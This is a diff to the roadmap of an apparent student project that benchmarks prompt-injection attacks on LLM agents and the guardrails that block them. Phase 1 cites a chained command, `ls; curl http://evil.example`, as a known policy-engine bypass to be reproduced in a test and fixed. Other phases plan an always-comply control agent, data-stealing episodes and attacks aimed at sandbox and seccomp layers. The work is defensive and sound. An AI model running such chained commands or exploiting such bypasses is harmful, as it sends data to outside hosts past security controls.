@@ -21,6 +21,7 @@ Decimal phases appear between their surrounding integers in numeric order.
 ## Phase Details
 
 ### Phase 1: Evaluation Hardening & Policy Fix
+
 **Goal**: Every number the benchmark produces from now on is trustworthy: scoring and reporting semantics are honest about outcomes, uncertainty and completeness, a model-independent control agent measures what the guardrails block, and the known policy bypass is closed before final runs.
 **Depends on**: Nothing (first phase)
 **Requirements**: EVAL-01, EVAL-02, EVAL-03, EVAL-04, EVAL-05, EVAL-06, EVAL-07, SEC-01, SEC-02
@@ -30,15 +31,22 @@ Decimal phases appear between their surrounding integers in numeric order.
   3. A test reproducing that `ls; curl http://evil.example` passes the policy engine fails before the fix and passes after it, with every sub-command of `;`, `&&`, `||`, `|`, `$(...)` and backticks checked and the chain blocked; the Flask dashboard binds to 127.0.0.1 with debug mode off by default.
   4. A scripted worst-case control agent (always obeys the injected instruction) runs through the same benchmark and both arms, and the report shows a model-independent count of what the guardrails block given an attempt.
   5. The viva page(s) for the reference monitor / access matrix / policy engine and for evaluation statistics (ASR definitions, Wilson intervals) are added to `docs/viva/` (definition of done for every phase; DOC-03 is traced to Phase 5).
+
 **Plans**: 4 plans
 
 Plans:
+**Wave 1**
 - [ ] 01-01-PLAN.md — Honest report: outcome taxonomy, ASR-valid, Wilson k/n cells, completeness gate, pair dropping, utility both arms, conditional block rate (wave 1)
 - [ ] 01-02-PLAN.md — Shell-chaining bypass reproduced red then fixed (fail-closed parser), policy hash, dashboard on 127.0.0.1 with debug off (wave 1)
+
+**Wave 2** *(blocked on Wave 1 completion)*
 - [ ] 01-03-PLAN.md — Provenance stamps on every record, provenance report section, paired interleaved queue, infra re-queue, manifest.json (wave 2)
+
+**Wave 3** *(blocked on Wave 2 completion)*
 - [ ] 01-04-PLAN.md — Scripted always-comply control agent through both arms with its own report section; docs/viva Phase 1 page and index (wave 3)
 
 ### Phase 2: Local Data Foundation & ScratchGPT
+
 **Goal**: A language model trained from scratch on this laptop's GPU drives the agent in the benchmark as `scratch-gpt`, trained on synthetic episodes that provably contain nothing from the benchmark and rendered by the same function at training and inference time.
 **Depends on**: Phase 1
 **Requirements**: SCRATCH-01, SCRATCH-02, SCRATCH-03, SCRATCH-04, SCRATCH-05
@@ -48,9 +56,11 @@ Plans:
   3. `python -m src.scratch_llm.train` trains ScratchGPT on the RTX 3060 and writes `models/scratch/scratch_gpt.pt`, a manifest (seed, dataset hash, config, git SHA) and a loss curve.
   4. `scratch-gpt` runs end-to-end through the benchmark (the provider loads the checkpoint via `inference.load_generator`) and produces valid actions on a smoke run.
   5. The viva page(s) for LLM foundations (transformers, tokenization, the training loop, decoding) and for the synthetic-data / leakage design are added to `docs/viva/` (DOC-03 is traced to Phase 5).
+
 **Plans**: TBD
 
 ### Phase 3: Qwen LoRA & hf_local Provider
+
 **Goal**: A pretrained small open model that the student fine-tuned locally with LoRA, and its un-tuned base as a control, both run through the benchmark behind the same provider interface as every other model.
 **Depends on**: Phase 2
 **Requirements**: LORA-01, LORA-02, LORA-03, LORA-04
@@ -60,9 +70,11 @@ Plans:
   3. The custom LoRA training loop fine-tunes Qwen2.5-0.5B on the Phase 2 synthetic episodes within 6 GB VRAM and writes the adapter plus a manifest, and a decoded-supervised-tokens test shows that only the assistant action tokens are supervised.
   4. The LoRA-tuned Qwen runs end-to-end through the benchmark and produces valid actions on a smoke run.
   5. The viva page(s) for fine-tuning and LoRA, chat templates and loss masking, and decoding are added to `docs/viva/` (DOC-03 is traced to Phase 5).
+
 **Plans**: TBD
 
 ### Phase 4: Full Runs - Local, Added Ollama, Hosted Resume
+
 **Goal**: Every model in the comparison has its complete, like-for-like benchmark data (or an honestly labelled partial), and the sandbox and seccomp layers are shown to fire on actions that only they can stop.
 **Depends on**: Phase 1, Phase 2, Phase 3
 **Requirements**: CMP-01, CMP-02, CMP-03, EVAL-08
@@ -72,9 +84,11 @@ Plans:
   3. The unfinished hosted non-Gemini runs (Groq gpt-oss-120b, gpt-oss-20b, qwen3.8-27b) are resumed with data-stealing episodes prioritised under a written stopping rule, and whatever remains incomplete is reported as partial with its n.
   4. A small layer-targeted attack suite drives actions that only the sandbox (namespaces / private filesystem) and seccomp layers can stop, and the where-blocked-by-layer data shows non-zero blocks for those layers.
   5. The viva page(s) for namespaces, seccomp-bpf, and local-inference confounds (quantization, context window) are added to `docs/viva/` (DOC-03 is traced to Phase 5).
+
 **Plans**: TBD
 
 ### Phase 5: Comparison Report & Deliverables
+
 **Goal**: The student can present and defend the multi-LLM + local-model result: one frozen data set drives a cross-model report, charts, README, SDD and Review-3 deck that cannot drift apart, backed by a complete set of viva notes.
 **Depends on**: Phase 4
 **Requirements**: DOC-01, DOC-02, DOC-03, DOC-04, DOC-05
@@ -83,6 +97,7 @@ Plans:
   2. The report includes static charts for ASR with confidence intervals per model, a capability-vs-vulnerability scatter, and a utility-vs-ASR arrow plot (unprotected to protected).
   3. The README and the IEEE 1016 SDD describe the multi-LLM + local-model system and its results (no longer Gemini-only), and a Review-3 slide deck presents the reviewer remark, the local models and the comparison results.
   4. `docs/viva/` is complete: theory notes for OS security (reference monitor, access matrix, capabilities, namespaces, seccomp-bpf), LLM foundations (transformers, training, LoRA, decoding), prompt injection and defenses, and evaluation statistics, plus likely examiner questions with answers; every earlier phase's page is present and this phase adds the Q&A and threats-to-validity page.
+
 **Plans**: TBD
 
 ## Progress
